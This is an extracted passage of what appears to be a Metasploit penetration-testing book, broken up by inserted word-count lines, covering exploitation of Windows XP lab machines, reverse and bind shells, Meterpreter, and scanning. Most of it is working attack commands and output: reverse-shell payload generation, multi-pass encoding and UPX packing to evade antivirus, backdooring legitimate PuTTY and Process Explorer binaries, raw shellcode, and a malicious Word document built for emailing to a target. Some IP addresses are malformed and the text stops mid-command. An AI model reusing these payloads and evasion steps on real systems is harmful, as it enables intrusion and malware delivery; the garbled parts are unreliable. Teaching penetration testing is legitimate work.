msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(ms08_067_netapi) > set TARGET 3
target => 3
msf exploit(ms08_067_netapi) > setg LHOST 192.168.33.129 X
LHOST => 192.168.33.129
msf exploit(ms08_067_netapi) > setg LPORT 8080
LPORT => 8080
msf exploit(ms08_067_netapi) > exploit -z Y
[Word Count: 47]

[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1032)
[*] Session 1 created in the background.
msf exploit(ms08_067_netapi) > sessions -u 1 Z
[Word Count: 38]

[*] Started reverse handler on 192.168.33.129:8080
[*] Starting the payload handler...
[*] Command Stager progress - 3.16% done (1694/53587 bytes)
[*] Command Stager progress - 6.32% done (3388/53587 bytes)
[Word Count: 29]

[*] Command Stager progress - 97.99% done (52510/53587 bytes)
[*] Sending stage (748032 bytes)
msf exploit(ms08_067_netapi) > [*] Meterpreter session 2 opened (192.168.33.129:8080 ->
192.168.33.130:1044)
msf exploit(ms08_067_netapi) > sessions -i 2
[*] Starting interaction with 2...
meterpreter >
[Word Count: 38]

At X we issue the setg command for LHOST and LPORT, which is required in 
order for the sessions -u 1 to upgrade to Meterpreter at Z. (The setg command 
sets the LPORT and LHOST globally in Metasploit, not just for this exploit.)
[Word Count: 43]

Notice at Y that when we exploit the system we issue the exploit -z 
command, which will not interact with the session once the target has been 
exploited. If you had already executed the exploit command at this point, 
you could simply press CTRL-Z and run the session in the background.
[Word Count: 51]

Manipulating Windows APIs with the Railgun Add-On
[Word Count: 7]

You can interface with the Windows native API directly through a Metasploit 
add-on called Railgun, which was written by Patrick HVE. By adding Railgun 
to the Metasploit Framework, you can natively call Windows APIs through 
Meterpreter, all through the Windows API. For example, in the following 
listing, we’ll drop into an interactive Ruby shell (irb), available through 
Meterpreter. The irb shell allows us to interact directly with Meterpreter 
through Ruby-based syntax. We call Railgun in this example and create a 
simple pop-up box saying “hello world”.
[Word Count: 86]

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.user32.MessageBoxA(0,"hello","world","MB_OK")
[Word Count: 17]

On our target Windows XP machine, you should see a pop-up box with 
world in the title bar and hello in the message box. In this example, we simply 
called the user32.dll and the MessageBoxA function, which takes the parameters 
as shown.
[Word Count: 42]

NOTE
For a list of all documented API calls, visit http://msdn.microsoft.com/.
[Word Count: 11]

We won’t cover Railgun in detail (you can find a tutorial within the 
Framework directory under external/source/meterpreter/source/extensions/stdapi/
server/railgun/), but this gives you an idea of its power. 
The implications are huge: Railgun gives you the same capabilities as a 
native Win32 application with full access to the Windows API.
[Word Count: 49]

Hopefully, you’re now pretty comfortable with Meterpreter. We haven’t gone 
through every Meterpreter flag and option, because we expect your knowl-
edge of Meterpreter to grow as you experiment and use it. Meterpreter is a 
continuously evolving tool with an enormous amount of support for scripts 
and additions. Once you become comfortable with the overall interface, you 
will be able to master anything new. In Chapter 16, you will learn how to cre-
ate your own Meterpreter scripts from scratch and how the overall structure 
of a Meterpreter script is designed.
[Word Count: 91]

Creating Stand-Alone Binaries with MSFpayload
[Word Count: 5]

Before we perform an antivirus evasion, let’s look at how to create stand-
alone Metasploit binary payloads with msfpayload. For starters, we’ll create a 
simple reverse shell that connects back to the attacker and spawns a command 
shell. We’ll use msfpayload and windows/shell_reverse_tcp. But first, let’s look at 
the available options for the shell_reverse_tcp payload using the O flag at X.
[Word Count: 61]

root@bt:/# msfpayload windows/shell_reverse_tcp O X
[Word Count: 5]

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique: seh, thread, process
LHOST                      yes       The local address
LPORT     4444             yes       The local port
[Word Count: 30]

Now let’s run msfpayload again and provide the options needed to create 
this payload in the Windows Portable Executable (PE) format. To do so, we 
provide the X option as shown at X as our output format:
[Word Count: 37]

root@bt:/# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X X > 
/var/www/payload1.exe
root@bt:/# file /var/www/payload1.exe
var/www/payload1.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit
[Word Count: 23]

Now we have a working executable, so we can start a listener with the 
multi/handler module in msfconsole. multi/handler allows Metasploit to listen 
for reverse connections.
[Word Count: 26]

msf > use exploit/multi/handler X
msf exploit(handler) > show options Y
[Word Count: 11]

Payload options (windows/meterpreter/reverse_tcp):
[Word Count: 3]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LHOST     192.168.1.101    yes       The local address
   LPORT     4444             yes       The local port
[Word Count: 29]

msf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp Z
PAYLOAD => windows/shell_reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.101 [
LHOST => 192.168.1.101
msf exploit(handler) > set LPORT 31337 \
LPORT => 31337
msf exploit(handler) >
[Word Count: 33]

We first use the multi/handler module at X and get a quick display of the 
options at Y. Then, we set our payload to be a Windows reverse shell at Z so 
that it matches the behavior of the executable we created earlier, tell it the IP 
at [ and the port to listen on at \, and we’re ready to go.
[Word Count: 62]

We’ll use the popular AVG Anti-Virus product in the following examples. 
Because it can take some time and multiple tries to circumvent certain antivirus 
engines, before we try to deploy a payload, we check the antivirus solution to 
make sure the payload gets past it before we deploy it on the target.
In this case, when we test our payload with AVG, we see that it’s detected, 
as shown in Figure 7-1.
[Word Count: 72]

root@bt:/opt/framework3/msf3# msfencode -l
[Word Count: 3]

Now we’ll run a simple encoding of an MSF payload by importing raw 
output from msfpayload into msfencode to see how the result affects our anti-
virus detection:
[Word Count: 28]

root@bt:/# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R X|
msfencode -e x86/shikata_ga_nai Y -t exe Z > /var/www/payload2.exe
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[Word Count: 23]

root@bt:/# file /var/www/payload2.exe [
/var/www/2.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit
[Word Count: 15]

We add the R flag at X to the msfpayload command line to specify raw 
output, because we will pipe its output directly into msfencode. We specify the 
x86/shikata_ga_nai encoder at Y and tell msfencode to send the executable out-
put -t exe Z to /var/www/payload2.exe. Finally, we run a quick check at [ to 
ensure that the resulting file is in fact a Windows executable. The response 
tells us that it is. Unfortunately, after the payload2.exe file is copied over to the 
Windows system, AVG detects our encoded payload yet again, as shown in 
Figure 7-2.
[Word Count: 97]

Figure 7-2: AVG detected our encoded payload.
[Word Count: 7]

It is recommended that you test your script using an evaluation version 
of a product to see if it bypasses the antivirus software prior to using it in a 
penetration test. Here’s an example of using multiple encoding passes:
[Word Count: 39]

Here we use five counts at X of shikata_ga_nai, feeding the code in raw 
format at Y into two counts of alpha_upper encoding at Z, which is then fed 
to another five counts of shikata_ga_nai [,followed by five counts of countdown 
encoding at \, before finally directing the output into the desired execut-
able. We are using a total of 17 encoding loops in an attempt to circumvent 
the antivirus software. And, as you can see in Figure 7-3, we have successfully 
slipped our payload past the antivirus engine.
[Word Count: 89]

Figure 7-3: AVG has not detected the multi-encoded payload.
[Word Count: 9]

Typically, when msfencode is run, the payload is embedded into the default 
executable template at data/templates/template.exe. Although this template is 
changed on occasion, antivirus vendors still look for it when building signa-
tures. However, msfencode now supports the use of any Windows executable 
in place of the default executable template via the -x option. In the follow-
ing example, we encode our payload again using the Process Explorer from 
Microsoft’s Sysinternals Suite as a custom-executable template.
[Word Count: 76]

root@bt:/opt/framework3/msf3# wget  http://download.sysinternals.com/Files/
ProcessExplorer.zip X
[Word Count: 5]

2011-03-21 17:14:46 (119 KB/s) - 'ProcessExplorer.zip' saved [1615732/1615732]
[Word Count: 8]

root@bt:/opt/framework3/msf3# cd work/
root@bt:/opt/framework3/msf3/work# unzip ../ProcessExplorer.zip Y
Archive:  ../ProcessExplorer.zip
  inflating: procexp.chm             
  inflating: procexp.exe             
  inflating: Eula.txt                
root@bt:/opt/framework3/msf3/work# cd ..
root@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp 
LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x work/procexp.exe Z 
-o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)
[Word Count: 72]

As you can see, at X we download Process Explorer from Microsoft 
then unzip it at Y. Then at Z we use the -x switch to specify the downloaded 
Process Explorer binary for use as our custom template. After encoding com-
pletes, we start up the multi-handler through msfcli to listen for the incoming 
connection, as shown here:
[Word Count: 58]

root@bt:/opt/framework3/msf3# msfcli exploit/multi/handler PAYLOAD=windows/
shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 E
[*] Please wait while we load the module tree...
[*] Started reverse handler on 192.168.1.101:8080 
[*] Starting the payload handler...
[*] Command shell session 1 opened (192.168.1.101:8080 -> 192.168.1.195:1191)
[Word Count: 37]

C:\Documents and Settings\Administrator\My Documents\Downloads>
[Word Count: 4]

And voilà: We have successfully opened a shell without being detected by 
antivirus software.
[Word Count: 14]

Figure 7-4: The backdoored executable is not detected by AVG.
[Word Count: 10]

For the most part, when a targeted user launches a backdoored executable 
such as the one we just generated, nothing will appear to happen, and that 
can raise suspicions. To improve your chances of not tipping off a target, you 
can launch a payload while simultaneously continuing normal execution of 
the launched application, as shown here:
[Word Count: 56]

root@bt:/opt/framework3/msf3# wget http://the.earth.li/~sgtatham/
putty/latest/x86/putty.exe X
[Word Count: 5]

2011-03-21 17:02:48 (133 KB/s) – 'putty.exe' saved [454656/454656]
root@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp
LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x putty.exe -o /var/
www/putty_backdoor.exe -e x86/shikata_ga_nai -k Y -c 5
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)
[Word Count: 64]

flag, when the payload is executed, the target will not see a console window. 
Paying attention to these little details can help you remain stealthy during an 
engagement.
[Word Count: 28]

Figure 7-5: AVG declares the payload safe and the computer secure.
[Word Count: 11]

root@bt:/# upx Y
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2009
UPX 3.04
 Markus Oberhumer, Laszlo Molnar & John Reiser 
Sep 27th 2009
[Word Count: 24]

Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..
[Word Count: 7]

Type 'upx--help' for more detailed help.
UPX comes with ABSOLUTELY NO WARRANTY; for details visit http://upx.sf.net
[Word Count: 16]

root@bt:/# upx -5 /var/www/payload3.exe Z
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2009
UPX 3.04
 Markus Oberhumer, Laszlo Molnar & John Reiser 
Sep 27th 2009
[Word Count: 26]

File size         
Ratio   
Format      
Name
   --------------------   ------   
-----------   -----------
37888 ->     22528   
59.46% [ win32/pe     payload3.exe
[Word Count: 16]

At X we install UPX, and then at Y we run UPX with no arguments to 
view its command line options. Then at Z we use the -5 option to compress 
and pack our executable. You can see at [ that UPX compresses our payload 
59.46 percent.
In our tests, only 9 of 42 antivirus vendors detected the UPX-packed binaries.
[Word Count: 60]

NOTE
The PolyPack project (http://jon.oberheide.org/files/woot09-polypack.pdf) 
shows the results of packing known malicious binaries with various packers and the 
effectiveness of antivirus detection before and after the packing process.
[Word Count: 28]

A Final Note on Antivirus Software Evasion
[Word Count: 7]

In this chapter we cover only the msfpayload and msfencode utilities, but there is an 
additional tool called msfvenom that combines the functionalities of msfpayload and 
msfencode in a simpler-to-use interface. Msfvenom is not covered in detail in this book 
(see Appendix B), but it should be very easy to use after you become familiar with 
msfpayload and msfencode.
[Word Count: 59]

E X P L O I T A T I O N  U S I N G  
C L I E N T - S I D E  A T T A C K S
[Word Count: 35]

Exploitation Using Client-Side Attacks
111
[Word Count: 5]

Now that you understand the basics of a heap spray and a NOP, let’s take a 
look at a generic NOP slide in an actual exploit. In the following listing, notice 
the hexadecimal representation of \x90, the Intel x86 architecture opcode. 
A 90 in Intel x86 assembly is a NOP. Here you see a series of \x90s that create 
our NOP-slide effect. The rest of the code is the payload, such as a reverse 
shell or a Meterpreter shell.
[Word Count: 79]

\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30
\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff
\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2
\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85
\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3
\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d
\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58
\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b
\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff
\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68
\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01
\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50
\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31
\xdb\x53\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\xc2
\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53
\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d
\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff
\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58
\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9
\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3
[Word Count: 23]

Using Immunity Debugger to Decipher NOP Shellcode
[Word Count: 7]

Exploitation Using Client-Side Attacks
113
[Word Count: 5]

chapters, a bind shell simply listens on a port on a target machine to which 
we can connect.
[Word Count: 18]

root@bt:/opt/framework3/msf3# msfpayload windows/shell/bind_tcp LPORT=443 C
[Word Count: 5]

When these commands are executed, “stage 1” and “stage 2” shellcodes 
are created in the output. We are concerned only with the stage 1 shellcode, 
because Metasploit will handle sending the second stage for us when we con-
nect to it. Copy and paste the shellcode from stage 1 into a text editor of your 
choice. You’ll need to do some minor editing before proceeding.
Now that you have your basic shellcode, add as many NOPs as you want 
to the beginning of it (such as \x90\x90\x90\x90\x90). Then remove all \x 
occurrences so it looks similar to the following:
[Word Count: 99]

909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090f
ce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f0
52578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c
738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe058
5f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504
050405068ea0fdfe0ffd59731db5368020001bb89e66a10565768c2db3767ffd5535768b7e938ffffd553535768
74ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5f
fd593536a005653576802d9c85fffd501c329c685f675ecc3
[Word Count: 8]

Figure 8-1: Examples of multiple NOPs that create the NOP slide
[Word Count: 11]

Exploitation Using Client-Side Attacks
115
[Word Count: 5]

Figure 8-2: The last part of our instruction set that we need
[Word Count: 12]

msf > use multi/handler
msf exploit(handler) > set payload windows/shell/bind_tcp
payload => windows/shell/bind_tcp
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > set RHOST 192.168.33.130
RHOST => 192.168.33.130
msf exploit(handler) > exploit
[*] Starting the payload handler...
[*] Started bind handler
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.33.129:60463 -> 192.168.33.130:443)
[Word Count: 58]

You have reached a basic command shell! As a good practicing technique, 
try a stage 1 Meterpreter reverse and see if you can get a connection. When 
you are finished, simply close the Immunity Debugger window and you’re all 
done. It’s important that you get familiar with Immunity Debugger now, 
because we will be leveraging it in later chapters. Now let’s launch our first 
browser exploit that uses a heap spray.
[Word Count: 71]

Exploring the Internet Explorer Aurora Exploit
[Word Count: 6]

msf > use windows/browser/ms10_002_aurora 
msf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) > show options
[Word Count: 18]

Name 
Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0 X        yes       The local host to listen on.
   SRVPORT     8080 Y           yes       The local port to listen on.
   SSL         false             no        Negotiate SSL for incoming connections
   SSLVersion  SSL3              no        Specify the version of SSL that should be used 
(accepted: SSL2, SSL3, TLS1)
   URIPATH Z                    no        The URI to use for this exploit (default is random)
[Word Count: 66]

Payload options (windows/meterpreter/reverse_tcp):
[Word Count: 3]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LHOST                      yes       The local address
   LPORT     4444             yes       The local port
[Word Count: 28]

msf exploit(ms10_002_aurora) > set SRVPORT 80
SRVPORT => 80
msf exploit(ms10_002_aurora) > set URIPATH / [
URIPATH => /
[Word Count: 19]

Exploitation Using Client-Side Attacks
117
[Word Count: 5]

msf exploit(ms10_002_aurora) > set LHOST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(ms10_002_aurora) > set LPORT 443
LPORT => 443
msf exploit(ms10_002_aurora) > exploit -z
[*] Exploit running as background job.
msf exploit(ms10_002_aurora) >
[*] Started reverse handler on 192.168.33.129:443
[*] Using URL: http://0.0.0.0:80/
[*] Local IP: http://192.168.33.129:80/
[*] Server started.
[Word Count: 49]

msf exploit(ms10_002_aurora) >
[*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.33.130
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1161)
[Word Count: 26]

msf exploit(ms10_002_aurora) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

meterpreter > run migrate 
[*] Current server process: IEXPLORE.EXE (2120)
[*] Migrating to lsass.exe...
[*] Migrating into process ID 680
[*] New server process: lsass.exe (680)
meterpreter >
[Word Count: 28]

This is a pretty manual process. You can automate this whole process 
using some advanced options to migrate to a process automatically upon a 
successful shell. Type show advanced to list the advanced features of the Aurora 
module:
[Word Count: 38]

msf exploit(ms10_002_aurora) > show advanced
[Word Count: 5]

Name           : ContextInformationFile
   Current Setting:
   Description    : The information file that contains context information
[Word Count: 14]

Name           : DisablePayloadHandler
   Current Setting: false
   Description    : Disable the handler code for the selected payload
[Word Count: 16]

Name           : EnableContextEncoding
   Current Setting: false
   Description    : Use transient context when encoding payloads
[Word Count: 14]

Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module
[Word Count: 13]

Payload advanced options (windows/meterpreter/reverse_tcp):
[Word Count: 4]

Name           : AutoLoadStdapi
   Current Setting: true
   Description    : Automatically load the Stdapi extension
[Word Count: 13]

Name           : AutoRunScript
   Current Setting:
   Description    : A script to run automatically on session creation.
[Word Count: 15]

Name           : AutoSystemInfo
   Current Setting: true
   Description    : Automatically capture system information on initialization.
[Word Count: 14]

Name           : InitialAutoRunScript
   Current Setting:
   Description    : An initial script to run on session created (before AutoRunScript)
[Word Count: 17]

Name           : ReverseConnectRetries
   Current Setting: 5
   Description    : The number of connection attempts to try before exiting the process
[Word Count: 19]

Exploitation Using Client-Side Attacks
119
[Word Count: 5]

Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module
[Word Count: 13]

By setting these options, you can fine-tune a lot of the payload and exploit 
details. Now suppose you wanted to change the amount of tries a reverse con-
nection would do. The default is 5, but you might be concerned with timeouts 
and want to increase the connection retries. Here, we set it to 10:
[Word Count: 55]

msf exploit(ms10_002_aurora) > set ReverseConnectRetries 10
[Word Count: 6]

In this case, you want to migrate automatically to a new process in case 
the targeted user closes the browser right away. Under the AutoRunScript, sim-
ply let Metasploit know to autorun a script as soon as a Meterpreter console is 
created. Using the migrate command with the -f switch tells Meterpreter to 
launch a new process automatically and migrate to it:
[Word Count: 62]

msf exploit(ms10_002_aurora) > set AutoRunScript migrate -f
[Word Count: 7]

available. In the next example, you can see that the file format is exported as 
a document:
[Word Count: 17]

msf > use windows/fileformat/ms11_006_createsizeddibsection
msf exploit(ms11_006_createsizeddibsection) > info
[Word Count: 8]

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Windows 2000 SP0/SP4 English
  2   Windows XP SP3 English
  3   Crash Target for Debugging
[Word Count: 23]

Next, you can see that we have a few targets available to use, but we’ll 
make it automatic and leave everything at the default settings:
[Word Count: 25]

Basic options:
  Name        Current Setting                      Required  Description
  ----        ---------------                      --------  -----------
  FILENAME    msf.doc                              yes       The file name.
  OUTPUTPATH  /opt/metasploit3/msf3/data/exploits  yes       The location of the file.
[Word Count: 25]

We’ll need to set a payload as usual. In this case, we will select our first 
choice, a reverse Meterpreter shell:
[Word Count: 21]

msf exploit(ms11_006_createsizeddibsection) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms11_006_createsizeddibsection) > set LHOST 172.16.32.128
LHOST => 172.16.32.128
smsf exploit(ms11_006_createsizeddibsection) > set LPORT 443
LPORT => 443
msf exploit(ms11_006_createsizeddibsection) > exploit
[Word Count: 31]

[*] Creating 'msf.doc' file...X
[*] Generated output file /opt/metasploit3/msf3/data/exploits/msf.docY
msf exploit(ms11_006_createsizeddibsection) >
[Word Count: 12]

Our file was exported as msf.doc X and sent to the /opt/ Y directory within 
Metasploit. Now that we have our malicious document, we can craft up an 
email to our target and hope the user opens it. At this point, we should 
already have an idea of the target’s patch levels and vulnerabilities. Before 
we actually open the document, we need to set up a multi-handler listener. 
This will ensure that when the exploit is triggered, the attacker machine can 
receive the connection back from the target machine (reverse payload).
[Word Count: 91]

Exploitation Using Client-Side Attacks
121
[Word Count: 5]

msf exploit(ms11_006_createsizeddibsection) > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.32.128
LHOST => 172.16.32.128
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
[*] Started reverse handler on 172.16.32.128:443
[*] Starting the payload handler...
msf exploit(handler) >
[Word Count: 57]

We open the document on a Windows XP virtual machine, and we 
should be presented with a shell (provided our VM is Windows XP SP3):
[Word Count: 25]

msf exploit(handler) > 
[*] Sending stage (749056 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.128:443 -> 172.16.32.131:2718) at 
Sun Apr 03 21:39:58 -0400 2011
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
[Word Count: 38]

We have successfully exploited a file format vulnerability by creating a 
malicious document through Metasploit and then sending it to our targeted 
user. Looking back at this exploit, if we had performed proper reconnaissance 
on our target user, we could have crafted a pretty convincing email. This exploit 
is one example of a number of file format exploits available in Metasploit.
[Word Count: 61]

M E T A S P L O I T  A U X I L I A R Y  
M O D U L E S
[Word Count: 26]

When most people think of Metasploit, exploits come 
to mind. Exploits are cool, exploits get you shell, and 
exploits get all the attention. But sometimes you need 
something more than that. By definition, a Metasploit 
module that is not an exploit is an auxiliary module, 
which leaves a lot to the imagination.
[Word Count: 52]

Name
Rank
Description
   ----
----
-----------
   admin/backupexec/dump
normal
Veritas Backup Exec Windows Remote 
File Access
   admin/backupexec/registry
normal
Veritas Backup Exec Server Registry 
Access
   admin/cisco/ios_http_auth_bypass
normal
Cisco IOS HTTP Unauthorized 
Administrative Access
. . . SNIP . . .
[Word Count: 38]

fuzzers/ssh/ssh_version_corrupt
normal
SSH Version Corruption
   fuzzers/tds/tds_login_corrupt
normal
TDS Protocol Login Request Corruption 
Fuzzer
   fuzzers/tds/tds_login_username
normal 
TDS Protocol Login Request Username 
Fuzzer
   fuzzers/wifi/fuzz_beacon
normal 
Wireless Beacon Frame Fuzzer
   fuzzers/wifi/fuzz_proberesp
normal 
Wireless Probe Response Frame Fuzzer
[Word Count: 34]

gather/citrix_published_applications
normal 
Citrix MetaFrame ICA Published 
Applications Scanner
   gather/citrix_published_bruteforce
normal 
Citrix MetaFrame ICA Published
Applications Bruteforcer
   gather/dns_enum
normal
DNS Enumeration Module
   gather/search_email_collector
normal
Search Engine Domain Email Address 
Collector
   pdf/foxit/authbypass
normal
Foxit Reader Authorization Bypass
   scanner/backdoor/energizer_duo_detect normal
Energizer DUO Trojan Scanner
   scanner/db2/db2_auth
normal
DB2 Authentication Brute Force Utility
   scanner/db2/db2_version
normal
DB2 Probe Utility
[Word Count: 53]

As you can see in this trimmed output, the auxiliary modules are orga-
nized by category. At your disposal are the DNS enumeration module, Wi-Fi 
fuzzers, and even a module to locate and abuse the Trojan backdoor that was 
included on Energizer USB battery chargers.
Using an auxiliary module is similar to using any exploit within the 
Framework—simply issue the use command followed by the module name. 
For example, to use the webdav_scanner module (explored in “Auxiliary Mod-
ules in Use” on page 126), you would run use scanner/http/webdav_scanner as 
shown below.
[Word Count: 92]

NOTE
In auxiliary modules, the basic options are slightly different with an RHOSTS option to tar-
get multiple machines and a THREADS value to fine-tune the speed of your scanning.
[Word Count: 30]

X msf > use scanner/http/webdav_scanner
Y msf auxiliary(webdav_scanner) > info
[Word Count: 10]

Name: HTTP WebDAV Scanner
    Version: 9179
    License: Metasploit Framework License (BSD)
       Rank: Normal
[Word Count: 13]

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        Use a proxy chain
Z 
RHOSTS 
yes       The target address range or CIDR identifier
  RPORT    80               yes       The target port
[ 
THREADS 1 
yes       The number of concurrent threads
  VHOST                     no        HTTP server virtual host
[Word Count: 48]

Description:
  Detect webservers with WebDAV enabled
[Word Count: 6]

msf auxiliary(webdav_scanner) > search scanner/http
[*] Searching loaded modules for pattern 'scanner/http'...
[Word Count: 12]

msf auxiliary(dir_webdav_unicode_bypass) > use scanner/http/webdav_scanner 
msf auxiliary(webdav_scanner) > show options
[Word Count: 10]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        Use a proxy chain
   RHOSTS
 yes 
The target address range or CIDR identifier
   RPORT    80               yes       The target port
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host
[Word Count: 44]

X msf auxiliary(webdav_scanner) > set RHOSTS 192.168.1.242, 192.168.13.242.252, 
192.168.13.242.254, 192.168.4.116, 192.168.4.118, 192.168.4.122, 
192.168.13.242.251, 192.168.13.242.234, 192.168.8.67, 192.68.8.113, 
192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66, 192.168.8.68, 
192.168.6.62
[Word Count: 22]

RHOSTS => 192.168.1.242, 192.168.13.242.252, 192.168.13.242.254, 192.168.4.116, 
192.168.4.118, 192.168.4.122, 192.168.13.242.251, 192.168.13.242.234, 192.168.8.67, 
192.168.6.113, 192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66, 
192.168.8.68, 192.168.6.62
msf auxiliary(webdav_scanner) > run
[Word Count: 22]

As you can see in this example, a number of HTTP servers have been 
scanned in the search for WebDAV X, and only one happens to have 
WebDAV enabled Y. This module has quickly identified a specific system 
against which you can launch further attacks.
[Word Count: 45]

NOTE
Auxiliary module functionality goes far beyond scanning. As you will see in Chapter 14 
auxiliary modules also work great as fuzzers with a little modification. A number of 
denial-of-service modules are also available for Wi-Fi (including dos/wifi/deauth), 
which can prove quite disruptive when used properly.
[Word Count: 46]

Let’s look at the makeup of an auxiliary module in a fun little example not 
currently in the Metasploit repository (because it does not pertain to pene-
tration testing). This example will demonstrate how easy it is to offload a 
great deal of programming to the Framework, allowing us to focus on the 
specifics of a module.
[Word Count: 57]

Chris Gates wrote an auxiliary module for the Framework that gave his 
Twitter followers the impression that he had somehow invented a device that 
allowed him to travel at the speed of light. It makes a great example of the 
code reuse available in Metasploit. (You can access the source of the script at 
http://carnal0wnage.googlecode.com/.)
[Word Count: 55]

X root@bt:/opt/framework3/msf3# cd modules/auxiliary/admin/
root@bt:/opt/framework3/msf3/modules/auxiliary/admin# wget http://carnal0wnage.googlecode
